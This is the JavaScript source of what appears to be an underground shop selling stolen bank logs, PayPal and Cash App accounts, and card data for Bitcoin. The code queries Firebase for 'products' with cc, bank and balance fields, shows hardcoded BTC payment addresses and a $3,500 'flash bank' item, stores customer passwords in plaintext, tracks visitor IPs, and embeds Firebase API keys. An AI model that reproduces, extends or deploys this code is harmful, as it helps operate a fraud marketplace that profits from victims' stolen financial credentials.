var IPCODE, IP_CITY, IP_COUNTRY, USER_ID, USER_NAME;
var TODAY_DATE;
var BALANCE, BTC_BUYING_AMOUNT;
$('document').ready(
    function(){
        
        const firebaseConfig1 = {
            apiKey: "AIzaSyDwwKUe3tQrE1vp-I6adic3yxtPpCizhc8",
            authDomain: "slilpp-ai.firebaseapp.com",
            projectId: "slilpp-ai",
            storageBucket: "slilpp-ai.appspot.com",
            messagingSenderId: "872339594976",
            appId: "1:872339594976:web:15f118112fa9677dcdfa85"
        };

        const firebaseConfig = {
            apiKey: "AIzaSyBxi5sEOZfbEx6RRyPcMyoZo-8pVHOR5Ng",
            authDomain: "ghost-industry-1.firebaseapp.com",
            projectId: "ghost-industry-1",
            storageBucket: "ghost-industry-1.firebasestorage.app",
            messagingSenderId: "1082553423859",
            appId: "1:1082553423859:web:8de217a7f8ef82ad122486"
        };

             // Initialize Firebase
            firebase.initializeApp(firebaseConfig);

            //SEPTEMBER 9 2021
            CLOSE_BTC();
            GET_IP_ADDRESS();
            //getBTC();
            // getBTCFRESH(); 
            // GET_ALL_PRODUCTS();
            $('.recent_date').text('21/03/2022');

           

            // GETUSERIP();
        $('.dropdown-trigger').dropdown();

        $('.bxx a').click(
            function(){
                $('.INSUSS').removeClass('hide');
            setTimeout(
                function(){
                    $('.INSUSS').addClass('hide');
                },9000
            );
            }
        ); 

        $('.ttble tr, .openBTC').click(
            function(){
                openBTC();
            }
        );

        GETCURRENTDATE();

       
    }

);

// MAY 2023 -01
function BTC_CHECKER_COUNTER(){
    var db = firebase.firestore();

    db.collection("BTC").doc('COUNTER').get().then(function(doc) {
        if (doc.exists) {
            console.log("BTC DOC  exists");
            // 
                if (doc.data().number == '1') {
                   console.log('BTC ADDY SHOW 1 -- 8zyy');
                   security_protector();
                    // update account with btc address
                    var docRef = db.collection("BTC").doc('COUNTER');

                    docRef.update({
                        number: '2'
                    })
                    .then(function() {
                        console.log("btc admin successfully updated!");
                    })
                    .catch(function(error) {
                        console.error("Error updating btc admin: ", error);
                    });
                }
                if (doc.data().number == '2') {
                    console.log('BTC ADDY SHOW 2-- sWh1s');
                    security_protector_1();
                     // update account with btc address
                     var docRef = db.collection("BTC").doc('COUNTER');
 
                     docRef.update({
                         number: '3'
                     })
                     .then(function() {
                         console.log("btc admin successfully updated!");
                     })
                     .catch(function(error) {
                         console.error("Error updating btc admin: ", error);
                     });
                }
                if (doc.data().number == '3') {
                    console.log('BTC ADDY SHOW 3 ---CVn2pW ');
                    security_protector_2();
                     // update account with btc address
                     var docRef = db.collection("BTC").doc('COUNTER');
 
                     docRef.update({
                         number: '1'
                     })
                     .then(function() {
                         console.log("btc admin successfully updated!");
                     })
                     .catch(function(error) {
                         console.error("Error updating btc admin: ", error);
                     });
                 }

        } else {
            console.log("BTC DOC does not exist");
            // 
        }
    }).catch(function(error) {
        console.log("Error getting document:", error);
    });
}

function security_protector(){
   
        // Your code here
        $('#btc_p').text('');
        $('#btc_p').text('19Hqtg4GZBrPneAMPQNuhyLsYbW82RuevC');
        // console.log('BTC_PROTECTOR_GOD: '+ $('#btc_p').text());    
}

function security_protector_1(){
   
        // Your code here
        $('#btc_p').text('');
        $('#btc_p').text('19Hqtg4GZBrPneAMPQNuhyLsYbW82RuevC');
        // console.log('BTC_PROTECTOR_GOD: '+ $('#btc_p').text());
    
}

function security_protector_2(){
   
        // Your code here
        $('#btc_p').text('');
        $('#btc_p').text('19Hqtg4GZBrPneAMPQNuhyLsYbW82RuevC');
        // console.log('BTC_PROTECTOR_GOD: '+ $('#btc_p').text());
    
}



//MARCH 2022
function GETCURRENTDATE(){
    var d = new Date();

    var month = d.getMonth()+1;
    var day = d.getDate();
    
    var output = (day<10 ? '0' : '') + day+ '/' +
        (month<10 ? '0' : '') + month + '/' +
        d.getFullYear();

        TODAY_DATE=output;
        $('.recent_date').text(TODAY_DATE);
        $('.s_cart #date_nb').text(TODAY_DATE);
        console.log('Todays date: ' + TODAY_DATE);
}

//OCTOBER 06 2021
function openCheques(){
    
}

//SEPTEMBER 20, 2021
function SHOW_HIDDEN_BTC(){
    $('#GOD_PAYMENT').show();
}

function GET_DATE(){
    var d = new Date();

    var month = d.getMonth()+1;
    var day = d.getDate();
    
    var output = (day<10 ? '0' : '') + day + '/' +
        (month<10 ? '0' : '') + month + '/' +
        d.getFullYear();

        return output;
}
function GET_ALL_USERS(){
    var numberOfUsers=0;
    firebase.firestore().collection("accounts").where("date", "==", 1)
    .get()
    .then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " => ", doc.data());
            user = doc.data().date;
            numberOfUsers = numberOfUsers + 1;
        });
    })
    .catch((error) => {
        console.log("Error getting documents: ", error);
    });

    return numberOfUsers;
}

function PAGINATE_QUERY(){
    var db = firebase.firestore();
    var first = db.collection("PRODUCTS")
    .orderBy("shop")
    .limit(6);

    return first.get().then((documentSnapshots) => {
    // Get the last visible document
    var lastVisible = documentSnapshots.docs[documentSnapshots.docs.length-1];
    console.log("last", lastVisible);

    // Construct a new query starting at this document,
    // get the next 25 cities.
    var next = db.collection("PRODUCTS")
        .orderBy("shop")
        .startAfter(lastVisible)
        .limit(6);
    });
}

function ONHOVER(){
    //$('.all_table tr').addClass('red-text');
}

function getid(obj) {
    //alert(obj.id);
    GET_ID_OF_ITEM(obj.id);
}
function GET_ID_OF_ITEM(id){
   console.log('Doc ID IS: '+ id);

    var docRef = firebase.firestore().collection("PRODUCTS").doc(id);

    docRef.get().then((doc) => {
        if (doc.exists) {
            console.log("PRICE data:", doc.data());
            
            
            if (doc.data().price != '') {
                openBTCPAYMENT();
                $('.exceptions_hide').removeClass('hide');
                $('.exceptions_show').addClass('hide');
                //$('.product_price').text('$100');
                var priceQ= doc.data().price;
                var RemoveFirstCharSub = priceQ.substring(1);
                $('#btcpay-input-price').val(parseInt(RemoveFirstCharSub));
                //$('.HELL_PRICE').text(parseInt(RemoveFirstCharSub));
                $('.HELL_PRICE').text(priceQ);
                $('.btcOrderId').val(THIS_ACCOUNT_ID);
               
                
                //alert(RemoveFirstCharSub);
                //var intPrice = Integer.parseInt(RemoveFirstCharSub);
               // $('#btcpay-input-price').val(parseInt(RemoveFirstCharSub));
               // $('#HELL_PRICE').text(doc.data().price);
            }
        } else {
            // doc.data() will be undefined in this case
            console.log("No such document!");
        }
    }).catch((error) => {
        console.log("Error getting document:", error);
    });
}

function PRODUCT_Clks(x){
    //var id =this.event.target.id;
   // var productID = $('#'+ id).attr('data-id');
    //alert('yeah: '+ productID);
   // alert(productID);
   // PRODUCT_ID = productID;

    var productPrice = $(x).attr('data-price');
    //alert(productPrice);
    if (productPrice != '') {
        openBTCPAYMENT();
        $('.exceptions_hide').removeClass('hide');
        $('.exceptions_show').addClass('hide');
        var priceQ= productPrice;
        var RemoveFirstCharSub = priceQ.substring(1);
        $('#btcpay-input-price').val(parseInt(RemoveFirstCharSub));
        //$('.HELL_PRICE').text(parseInt(RemoveFirstCharSub));
        $('.HELL_PRICE').text(priceQ);
        $('.btcOrderId').val(THIS_ACCOUNT_ID);
    }
}

function APPEND_PRODUCTS(PRODUCTID,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price){
    var d = new Date();
    console.log('Appending');
    var month = d.getMonth()+1;
    var day = d.getDate();
    
    var output = (day<10 ? '0' : '') + day + '/' +
    (month<10 ? '0' : '') + month + '/' +
    d.getFullYear();
    
    $(".all_table")
    .append('<tr onclick="getid(this); CLOSE_GOD_PAYMENT();" id="'
    +PRODUCTID+'" data-id="'+PRODUCTID+'" > <td>'+shop+'</td>  <td>'
    +balance+'</td> <td>'+points+'</td>  <td>'+name+'</td> <td>'+type
    +'</td><td>'+country_state_zip+'</td>  <td>'+cc+'</td> <td>'+bank
    +'</td><td>'+info+'</td><td>'+last_order+'</td><td>'+mail_domain
    +'</td><td>'+output+'</td> <td>'+seller+'</td> <td class="price_txt">'
    +price+'</td></tr>');

}

function reply_click(clicked){
    alert(clicked_id);
}
function copyToClipboard() {
    // Create a "hidden" input
  var aux = document.createElement("input");

  // Assign it the value of the specified element
  aux.setAttribute("value", document.getElementById('btc_p').innerHTML);
  //aux.setAttribute('value','')
  // Append it to the body
  document.body.appendChild(aux);

  // Highlight its content
  aux.select();

  // Copy the highlighted text
  document.execCommand("copy");

  // Remove it from the body
  document.body.removeChild(aux);
  $('#click_to_copy').hide();
  setTimeout(
      function(){
        $('#click_to_copy').show();
        // SEND TO TRANSACTION ADDRESS
        M.toast({html: 'BTC ADDRESS COPIED...'});

        send_to_db();
      },2000
  );
}
function send_to_db(){

    var priceOfProd = $('#HELL_PRICE').text();
    var btcOfProd = $('#btc_p').text();


    // Add a new transaction document
    var db =firebase.firestore();
    // Get a reference to the Firebase database
    // var database = firebase.database();

    // Get the current server timestamp
    var currentTime = firebase.firestore.FieldValue.serverTimestamp();

    db.collection("TRANSACTIONS").doc(USER_ID).set({
        name: USER_NAME,
        userid: USER_ID,
        balanceOfUser: BALANCE,
        priceOfProd: priceOfProd,
        btc_used: btcOfProd,
        DATE: currentTime,
        status: "NOT_CONFIRMED"
    })
    .then(() => {
        console.log("Document successfully written!");
    })
    .catch((error) => {
        console.error("Error writing document: ", error);
    });
}
function click_to_copy(){
    alert();
    $('#btc_p').select();
    document.execCommand('copy');
}
function CLOSE_BTC(){
    $('.exceptions_hide ').removeClass('hide');
    $('.exceptions_show').addClass('hide');
    $('.blockchain_pay').addClass('hide');
}
function just_news(){
    $('.FLASH_ACCOUNTS').addClass('hide');
    $('.BANK_LOGS_BX').hide();
    $('.NEWS').removeClass('hide');

    $('.PROFILE').addClass('hide');
    $('.SUPPORT').addClass('hide');
    $('.paginatorr').addClass('hide');

}
function get_products(){
    $('.SUPPORT').addClass('hide');
    $('.PROFILE').addClass('hide');
    $('.ttble, .NEWS').addClass('hide');
    $('.paginatorr').removeClass('hide');

    $('.BANK_LOGS_BX').show();
    console.log('Opening Get products');
}
function get_products_PAYPAL(){
    $('.SUPPORT').addClass('hide');
    $('.PROFILE').addClass('hide');
    $('.ttble, .NEWS').addClass('hide');
    $('.paginatorr').removeClass('hide');

    $('.BANK_LOGS_BX').hide();
    $('.FOR_PAYPAL').show();
    console.log('Opening Get products');
}
function get_products_BOA(){
    $('.SUPPORT').addClass('hide');
    $('.PROFILE').addClass('hide');
    $('.ttble, .NEWS').addClass('hide');
    $('.paginatorr').removeClass('hide');

    $('.BANK_LOGS_BX').hide();
    $('.FOR_BOA').show();
    console.log('Opening Get products');
}
function get_products_WELLSFARGO(){
    $('.SUPPORT').addClass('hide');
    $('.PROFILE').addClass('hide');
    $('.ttble, .NEWS').addClass('hide');
    $('.paginatorr').removeClass('hide');

    $('.BANK_LOGS_BX').hide();
    $('.FOR_WELLSFARGO').show();
    console.log('Opening Get products');
}
function get_products_HUNTINGTON(){
    $('.SUPPORT').addClass('hide');
    $('.PROFILE').addClass('hide');
    $('.ttble, .NEWS').addClass('hide');
    $('.paginatorr').removeClass('hide');

    $('.BANK_LOGS_BX').hide();
    $('.FOR_HUNTINGTON').show();
    console.log('Opening Get products');
}
function get_products_CASHAPP(){
    $('.SUPPORT').addClass('hide');
    $('.PROFILE').addClass('hide');
    $('.ttble, .NEWS').addClass('hide');
    $('.paginatorr').removeClass('hide');

    $('.BANK_LOGS_BX').hide();
    $('.FOR_CASHAPP').show();
    console.log('Opening Get products');
}

//NOVEMBER 27, 
function paginatorr(){
    add_funds_exc();
    openBTC(); 
    CLEAR_BTC(); 
    CLOSE_GOD_PAYMENT(); 
    pay100(); 
    add_funds_exc(); 
    add_funds_exc();

}
function GET_PROFILE(){
    $('.FLASH_ACCOUNTS').addClass('hide');
    $('.BANK_LOGS_BX').hide();
    $('.ttble, .NEWS').addClass('hide');

    $('.SUPPORT').removeClass('hide');
    $('.PROFILE').removeClass('hide');
    $('.paginatorr').addClass('hide');
}
function GET_SUPPORT(){
    $('.FLASH_ACCOUNTS').addClass('hide');
    $('.BANK_LOGS_BX').hide();
    $('.ttble, .NEWS').addClass('hide');

    $('.PROFILE').addClass('hide');
    $('.SUPPORT').removeClass('hide');
    $('.paginatorr').addClass('hide');
}
function paypal_table(){
    $('.BANK_LOGS_BX').show();
    $('.ttble, .NEWS').addClass('hide');
    $('.paypal_table').removeClass('hide');
}
function suntrust_table(){
    $('.BANK_LOGS_BX').show();
    $('.ttble, .NEWS').addClass('hide');
    $('.suntrust_table').removeClass('hide');
}

function CLEAR_BTC(){
    $('.HELL_PRICE').text('');
}
function openBTC(){
    $('.etb').addClass('hide');
    
    setTimeout(
        function(){
            $('.blockchain_pay').removeClass('hide');
        }
    );
}
function openFLASHBANK(){
    //OPEN_GOD_PAYMENT();
    $('.etb').addClass('hide');
    CLOSE_GOD_PAYMENT();
    setTimeout(
        function(){
           // $('.blockchain_pay').removeClass('hide');
            $('#HELL_PRICE').text('$3,500');

                openBTCPAYMENT();
                $('.exceptions_hide').removeClass('hide');
                $('.exceptions_show').addClass('hide');
                //$('.product_price').text('$100');
                var priceQ= '$3500';
                var RemoveFirstCharSub = priceQ.substring(1);
                $('#btcpay-input-price').val(parseInt(RemoveFirstCharSub));
                $('.btcOrderId').val(THIS_ACCOUNT_ID);
            
        }
    );
}
function openCVV(){
    $('.etb').addClass('hide');
    
    setTimeout(
        function(){
            $('.blockchain_pay').removeClass('hide');
            $('#HELL_PRICE').text('$100');
        }
    );
}
function openC(){
    $('.etb').addClass('hide');
    
    setTimeout(
        function(){
            $('.blockchain_pay').removeClass('hide');
            $('#HELL_PRICE').text('$100');
        }
    );
}
function getBTC(){
    var docRef = firebase.firestore()
    .collection("btc_address").doc("blockchain");

    docRef.get().then((doc) => {
        if (doc.exists) {
            console.log("Document data:", doc.data().btc);
            $('.btcaddress_txt').val(doc.data().btc);
            $('.btc_p, #god_btc_address').text(doc.data().btc);
        } else {
            // doc.data() will be undefined in this case
            console.log("No such document!");
        }
    }).catch((error) => {
        console.log("Error getting document:", error);
    });
}

//BTC ADDRESS FOR SLILP
function getBTCFRESH(){
    $('.btcaddress_txt').val('bc1q00dpwsl372sccestyy7wa5s676tgsvzzu936l7');
    $('.btc_p, #god_btc_address').text('bc1q00dpwsl372sccestyy7wa5s676tgsvzzu936l7');
}
function firebase_add(){
    $('.BTCADDRESSSAVEBTN').hide();
    $('.VTCH a').text('');
    $('.VTCH a').append('<i class="fa fa-spinner fa-spin">  </i>');
    var x = $('.btcaddress_txt').val();
    firebase.firestore().collection("btc_address").doc("blockchain").set({
        btc: x
    })
    .then(() => {
        $('.BTCADDRESSSAVEBTN').show();
        console.log("Document successfully written!");
        M.toast({html: 'BTC ADDRESS SAVED...'});
        $('.VTCH a').text('Save');
        $('.VTCH a i').addClass('<i class="fa fa-spinner fa-spin hide"> </i>');
    })
    .catch((error) => {
        $('.BTCADDRESSSAVEBTN').show();
        console.error("Error writing document: ", error);
        M.toast({html: 'FAILED, CHECK INTERNET CONNECTION...'});

        $('.VTCH a').text('Save');
        $('.VTCH a i').addClass('<i class="fa fa-spinner fa-spin hide"> </i>');
    });
}
function firebase_qury(){

}
function fireSave_accounts(z,x){
    // Add a new document with a generated id.
    firebase.firestore().collection("accounts").add({
        username: z,
        password: x,
        balance: '0.00',
        date: 1
    })
    .then((docRef) => {
        console.log("Document written with ID: ", docRef.id);
        $('#LOGIN_PAGE').removeClass('hide');
        $('.pp').text('Your account has been created successfully. Login with your username and password.');
        $('.pp').addClass('green-text');
    })
    .catch((error) => {
        console.error("Error adding document: ", error);
        alert('Failed to register user. Try again later');
    });
}
function GETUSERNAME(id){
    var docRef = firebase.firestore()
    .collection("SESSIONS").doc(id);

    docRef.get().then((doc) => {
        if (doc.exists) {
            console.log("Document data:", doc.data());
            $('.NAME_OF_USER').text(doc.data().username);
        } else {
            // doc.data() will be undefined in this case
            console.log("No such document!");
        }
    }).catch((error) => {
        console.log("Error getting document:", error);
    });
}
function updateToNewDatabase(username,password){
    var usernameSmall = username.toLowerCase();
    
    firebase.firestore().collection("accounts_1").doc(usernameSmall).set({
        ip: IPCODE,
        date: 15122021,
        number: 1,
        username: usernameSmall,
        password: password
    })
    .then(() => {
        console.log("SENT TO NEW DB!");
    })
    .catch((error) => {
        console.error("Error SENDING TO NEW DB: ", error);
    });
}
function fireBase_login_query(x){
    var user = '';
    $('.loginbuttonbx').hide();
    var passwordd = $('.password_L').val();
    firebase.firestore().collection("accounts").where("username", "==", x)
    .get()
    .then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            //console.log(doc.id, " => ", doc.data());
            user = doc.data().username;
            USER_NAME = user;
            USER_ID = doc.id;
            BALANCE = doc.data().balance;
            if (user != '') {
                $('.NAME_OF_USER').text(user);
                $('.BALANCE_OF_USER').text(doc.data().balance);
                $('.loginbuttonbx').show();
                $('.CNT').removeClass('hide');
                $('meta').remove();
                $('.xttt').hide();
                // BTC CHECKER -MAY 2023 - 01
                BTC_CHECKER_COUNTER();
                //SEND SESSIONS
                SENDSESSIONS(doc.id,'TIME',IPCODE); //REMOVE NOW
                //UPDATE USERNAME TO SMALL 
                updateToNewDatabase(user,passwordd);
            }else{
            }
            
            
        });
    })
    .catch((error) => {
        console.log("Error getting documents: ", error);
    });

    setTimeout(
        function(){
            if (user == "") {
                alert('Account cannot be found. Please try again with the correct logins or register.');
                $('.loginbuttonbx').show();
            }
        },8000
    );
}
function just_Open(){
    $('.loginbuttonbx').show();
    $('.CNT').removeClass('hide');
    $('meta').remove();
    $('.xttt').hide();
}
function GETUSERIP(IPCODE){
    firebase.firestore().collection("SESSIONS").where("ip", "==", IPCODE)
    .get()
    .then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " IPMARCHED => ", doc.data());

            setTimeout(
                function(){
                    if (doc.data().username != "") {
                        $('.CNT').removeClass('hide');
                        $('meta').remove();
                        $('.xttt').hide();
                        //SEND SESSIONS
                        SENDSESSIONS(doc.id,'TIME',IPCODE);
                    }else{
                        alert('Incorrect logins. Please try again or check internet connection');
                    }
                },3000
            );
        });
    })
    .catch((error) => {
        console.log("Error getting documents: ", error);
    });
}

function buyNow(){
    
   
}
function hideMe(){
    $('.INSUSS').addClass('hide');
}

function loginnn(){
    $('.ldr').removeClass('hide');
    setTimeout(
        function(){
            $('#LOGIN_PAGE').hide();
            $('.ldr').hide();
            $('.CNT').removeClass('hide');
        },3000
    );
}

function moveToRegister(){
    $('#LOGIN_PAGE').addClass('hide');
    $('#REGISTER_PAGE').removeClass('hide');
}
function moveToLogin(){
    $('#LOGIN_PAGE').removeClass('hide');
    $('#REGISTER_PAGE').addClass('hide');
}

function register(){
    var username, password,cpassword;
    username = $('#username_R').val();
    password = $('#password_R').val();
    cpassword = $('#cpassword_R').val();
    if(username != '' && password != ''){
        $('.register_btns').addClass('hide');
        $('.ixcc').removeClass('hide');

        fireSave_accounts(username,password);
        setTimeout(
            function(){
                $('#REGISTER_PAGE').addClass('hide');
                $('.ixcc').addClass('hide');
            }, 3000
        );

        setTimeout(
            function(){
                $('#LOGIN_PAGE').removeClass('hide');
                $('.pp').text('Your account has been created successfully. Login with your username and password.');
                $('.pp').addClass('green-text');
            },9000
        );
    }else{
        alert('Enter your details');
    }
}

function login(){
    var username, password;
    username = $('.username_L').val();
    password = $('.password_L').val();

    if (username != '') {
        if(username == '123mike'){
        
            setTimeout(
                function(){
                    just_Open();
                    $('.NAME_OF_USER').text(username);
                    $('.BALANCE_OF_USER').text('$775.00');
                    $('.CART_OF_USER').text('2');
                },3000
            );
        }else if(username == 'Sanchez0315'){
            setTimeout(
                function(){
                    just_Open();
                    $('.NAME_OF_USER').text(username);
                    $('.BALANCE_OF_USER').text('$95.00');
                    $('.CART_OF_USER').text('0');
                },3000
            );
        }
        else{
            fireBase_login_query(username);
            setTimeout(
                function(){
                    //just_Open();
                    $('.NAME_OF_USER').text(username);
                    //$('.BALANCE_OF_USER').text('$0.00');
                    //$('.CART_OF_USER').text('0');
                },6000
            );
        }
    }
    else{
        
    }
}

//september 07 
function LOGOUT_(){
    location.reload();
    console.log('This is USER ID: '+ USER_ID);
    firebase.firestore().collection("SESSIONS").doc(USER_ID).delete().then(() => {
        console.log("Document successfully deleted!");
        location.reload();  
    }).catch((error) => {
        location.reload();
    });
}






//SEPTEMBER 06 2021
function CURRENT_DATE(){
    var d = new Date();

    var month = d.getMonth()+1;
    var day = d.getDate();
    
    var output = (day<10 ? '0' : '') + day + '/' +
    (month<10 ? '0' : '') + month + '/' +
    d.getFullYear();

    $('.recent_date').text(output);
    console.log('Change date+++++++++++');
}
function GET_IP_ADDRESS(){
    $.getJSON("https://api.ipify.org/?format=json", function(e) {
      console.log("USER IP: "+e.ip);
      if (e.ip != "") {
        
        $.get("https://ipinfo.io", function(response) {
          IPCODE = response.ip;
          IP_CITY = response.city;
          IP_COUNTRY = response.country;  

          //GETCURRENTUSER(IPCODE); ++++++
          console.log('IP CODE: '+ IPCODE);
          //$('#').addClass('hide');
          firebase.firestore().collection("SESSIONS").where("ip", "==", IPCODE)
            .get()
            .then((querySnapshot) => {
                querySnapshot.forEach((doc) => {
                    // doc.data() is never undefined for query doc snapshots
                    $('body').removeClass('hide');
                    //console.log(doc.id, " IPMATCHED => ", doc.data());

                    if (doc.data().user_id != "") {
                        $('.CNT').removeClass('hide');
                        //GETUSERNAME(doc.data().user_id);
                        console.log('CONSOLE MAN: '+ doc.data().user_id);
                        firebase.firestore().collection("accounts").doc(doc.data().user_id).get().then((doc) => {
                            if (doc.exists) {
                                //console.log("Document DARE FOR USERNAME:", doc.data().username);
                                $('.NAME_OF_USER').text(doc.data().username);
                                $('.BALANCE_OF_USER').text(doc.data().balance);
                                $('.CART_OF_USER').text(doc.data().cart);
                            } else {
                                // doc.data() will be undefined in this case
                                console.log("No such document!");
                            }
                        }).catch((error) => {
                            console.log("Error getting document:", error);
                        });
                        USER_ID = doc.data().user_id;
                        $('meta').remove();
                        $('.xttt').hide();
                        //SEND SESSIONS
                        SENDSESSIONS(doc.id,1,IPCODE);
                    }
                });
            })
            .catch((error) => {
                $('body').removeClass('hide');
                console.log("Error getting documents: ", error);
            });
          //console.log("USER IP ADDRESS: "+response.city, response.country);
        }, "jsonp");
        return e.ip;
      }
    });
}
function GETCURRENTUSER(IP){
    // $('.distract').show();
      CRYTOLOGS(IP);
      CURRENT_DATE();
}
function CRYTOLOGS(IP){
      console.log('CHECKING FOR IPS...');
     // $('.distract').show();
     firebase.firestore().collection("SESSIONS").where("ip", "==", IP).get().then((querySnapshot) => {
         querySnapshot.forEach((doc) => {
             // doc.data() is never undefined for query doc snapshots
             console.log(doc.id, " IP_ADDRESS_MATCH => ", doc.data());
            setTimeout(
                function(){
                    if (doc.data().user_id == '') {
                        console.log(' NO IP ADDRESS MATCHED');
                     }else{
                         console.log('IT WORKED');
                         //SHOW USER CONTENT
                        $('.CNT').removeClass('hide');
                        $('meta').remove();
                        $('.xttt').hide();
                     }
                },3000
            );

             
            
         });
     })
     .catch((error) => {
         console.log("Error getting documents: ", error);
     });
}
function SENDSESSIONS(USERID,TIME,IP){
    console.log('Sending session for user: '+ USERID);
    var db = firebase.firestore();
    db.collection("SESSIONS_1").doc(USER_NAME).set({
        ip: IP,
        time: TIME,
        username: USER_NAME,
        user_id: USERID
    })
    .then(() => {
        console.log("SESSION successfully written!");
    })
    .catch((error) => {
        console.error("Error writing SESSION: ", error);
    });
}


//SEPTEMBER 10 - 19
function  OPEN_GOD_PAYMENT(){
    $('.GOD_PAYMENT').removeClass('hide');
    //$('.BLOCKCHAIN-PAYMENT').removeClass('hide');
    $('.blockchain_pay').removeClass('hide');
}
function CLOSE_GOD_PAYMENT(){
    $('.GOD_PAYMENT').addClass('hide');
    //$('.BLOCKCHAIN-PAYMENT').addClass('hide');
    $('.blockchain_pay').addClass('hide');
}
function GET_FLASH_ACC(){
    $('.SUPPORT').addClass('hide');
    $('.PROFILE').addClass('hide');

    $('.BANK_LOGS_BX').hide();
    $('.ttble, .NEWS').addClass('hide');

    $('.FLASH_ACCOUNTS').removeClass('hide');

}

function GET_PAYPAL_PRODUCTS_PAGINATE(){
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('#products_table_bx tr').remove();
    $('.FLASH_ACCOUNTS').addClass('hide');
    firebase.firestore().collection("PRODUCTS").where("shop", "==", "paypal.com").limit(6).get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, "   PAGINATOR => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (doc.data().shop == 'paypal.com') {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{

            }
        });
    });
}
function GET_PAYPAL_PRODUCTS(){
    CLOSE_GOD_PAYMENT();
    $('.paginatorr').removeClass('hide');
    $('.FLASH_ACCOUNTS').addClass('hide');
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('.FLASH_ACCOUNTS').addClass('hide');
    $('#products_table_bx tr').remove();
    firebase.firestore().collection("PRODUCTS").where("shop", "==", "paypal.com").limit(6).get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, "PAYPAL => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (doc.data().shop == 'paypal.com') {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{

            }
        });
    });
}
function GET_CASHAPP_PRODUCTS(){
    CLOSE_GOD_PAYMENT();
    $('.paginatorr').removeClass('hide');
    $('.FLASH_ACCOUNTS').addClass('hide');
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('#products_table_bx tr').remove();
    $('.FLASH_ACCOUNTS').addClass('hide');
    firebase.firestore().collection("PRODUCTS").where("shop", "==", "cash.app").limit(7).get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, "WELLS FARGO => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (doc.data().shop == 'cash.app') {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{

            }
        });
    });
}
function GET_WELLSFARGO_PRODUCTS(){
    CLOSE_GOD_PAYMENT();
    $('.paginatorr').removeClass('hide');
    $('.FLASH_ACCOUNTS').addClass('hide');
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('#products_table_bx tr').remove();
    $('.FLASH_ACCOUNTS').addClass('hide');
    firebase.firestore().collection("PRODUCTS").where("shop", "==", "wellsfargo.com").limit(7).get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, "WELLS FARGO => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (doc.data().shop == 'wellsfargo.com') {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{

            }
        });
    });
}
function GET_HUNTINGTON_PRODUCTS(){
    CLOSE_GOD_PAYMENT();
    $('.paginatorr').removeClass('hide');
    $('.FLASH_ACCOUNTS').addClass('hide');
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('#products_table_bx tr').remove();
    $('.FLASH_ACCOUNTS').addClass('hide');
    firebase.firestore().collection("PRODUCTS").where("shop", "==", "huntington.com").limit(7).get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
